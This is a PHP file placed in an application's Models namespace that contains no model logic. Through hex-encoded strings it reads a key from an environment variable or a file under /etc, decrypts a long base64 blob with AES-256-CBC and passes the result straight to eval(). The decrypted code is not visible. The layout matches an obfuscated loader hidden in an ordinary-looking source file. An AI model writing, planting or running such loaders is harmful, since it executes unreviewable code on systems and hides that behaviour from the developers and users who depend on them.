<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('5o3eKMgIX4H8GKmW0YbqKg==');

$c=base64_decode(

'PBwJGkjgsIu2UyNIInlKrAeTHhVy1fsWvKoQM3BpQ79gAFUYLYmvzhxUUNTS5WclZ0ea608HeuAK' .
'GUvg24nRu872xfnCxCPaTVNVAhtb+2rEfRyNAZ7hRbOuWDCx5GUbL/49kX7YcrRC684q2A86fiGw' .
'XqotcUc/dpA2hiQuRx4voA5IXL3ZdffevCK1ltG5n6awde58DsjFnZDoeBL4DwUVgsA4znEN0eJu' .
'XdQjAolVMcsbLUIn6Jfktstea5CE9vjEcUzoVPPZHRgJcBJvK7DsPGgS3Ekrze3uILnwzk8Ijskf' .
'SOoQ93/JkKS2UKIjyMnuAcnhFKo8eaHbOfsdPYVtsXOKkFW14sQcazXJrxOuHF3tKMjXQnvH4lSn' .
'XTCkfBsGDuharQvaemfqP7gsdN/bWM6DDs0Teq34BtCHwsmpzXH/JjcpQm4t9OIwFVUFX0aEdx+z' .
'NISqaxs9LVxZwFvdORxk4pVeYq/tE/vsIypwmNedVcAhcKphCtvr8Rckd5t6seQF5KkU4Z9QHNt/' .
'vPLMtZi3VfSIXfTrD0j2EJHpEoPGbTUVBvPcru9SPHJo/5fHA6gCMyLe83dtFSq8wYJTI1oQt3lJ' .
'qpbqNf9yuxx0+QgrL/CDMJ2OAbs6SrSHEHDxPFwt7lbzr/LEhmcVPdd5BsMq0Hcf5zpejC59cPqD' .
'yRqoiQI0dM3T3hjwEopyOxRjvsPwyrZpalXevCcX+NM683qLx4ojGFpkWep2a5/4sb1/QGEm33rj' .
'z8KmxJIC5A55DnuS3XrQEbXRr0qccXnF1KKn8p4byDqRPpDpHhj4YiOX+oIP8XoACdkwlUZuSNLk' .
'Vql1XYGgKLzngXRRSqm5ohBpIlTC4JqTS9lk6/5iEPULeFkJ1nTKwsme6uI0ITAID2DWvW/oAlpT' .
'cnNDn8LCaCz4tJoieTCsiL96xuT8WUvXQnIw3f2rjDBRF/XyWA//EZV5xdRjM3deFM6NuEUo2oFG' .
'DkC3cQz3+aRLRQwQN0M4B8VBX+HGjGP6PCymDAr9VhZFzg7q1oThaolFwPUNDBY78EMMpjHgF1Hk' .
'kAjbVzaaYIbv9poilzUd+GHXFE2wk4p+DmPVzLuiPqPvVkcaCZio8aRonyjOzIQLzhbw0gjBfw0a' .
'fRUuXjNTozxKl9517QYbs78+n7VV060kpkeNlGW5uWj2NoEMPrPPXTHdBz8Kit94T1qXj7agTubw' .
'pgDyATLobOTC4ChQB1dOnIspVVKdDuNDKKPwHnolYJr2HafA7kuUXSH72w3jjjvfO6ym/O8GMDug' .
'1LUUHbKmyR4DczZNr1/9TZgQ5IZIkzqA+XIU42avwP0MVwdVK6YYjFB+SKeDg+CNCCdKYVsKp4MH' .
'vrcwO3hmEkuxbGWgg/XsTP9hWbbsTZiJVLFmDqscqTFYgzycyntVjbR+giwkr08H8Iq54+Xq+Q7U' .
'MseBn3RbZKs4EWhBDk7PinBXy5T5IWATUd1VTx2wCUPTZQFqnJw10zYIVCuEA9UleAVOkUbvhtNA' .
'HCuey0HBO0OqC/5pM6D6Rde8b84rXHGne3tj2rHTXoYqGzRKBDjyz2DGtHIn/zXjSEg0ShpMQ3jN' .
'jBIWW9jem2X3Hvp8XFB0bqEK6ybcg4aDKmDTx5qI1pu1Gwsw0SD8dV9ICrG9lrMWezb62eyq+iO1' .
'F9gcV+FTzsemqxaqN6t2ln0F9wUwcCC4W2+mJwuDHPlJrs4d5xKdMfqWbyO9Iea6bo3qFhmhv0JP' .
'SynnKQCKiLOA8V8D8inQSrXG9Pz5bS72y3eKoXoXTt99hTD7M2GMeTlXhohOO9/QYr8VwdODcf2x' .
'OTOm+Vg1BfD2WQ4rT0D/vvRU9JxVram2hys+qDTNDCpJaHeiyDsh8tJuDzuVOCnxGMj6K8hm2Qc8' .
'cC3ZmDf8toXN6p6tpmXlYyeWK+w5vcVFWCjxrtIweXUFwTBSxwos+kNo3wikK8TTvrAu7akIa1sj' .
'W3K25GhF5TO6mEO95nOFSoMkOaY34Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

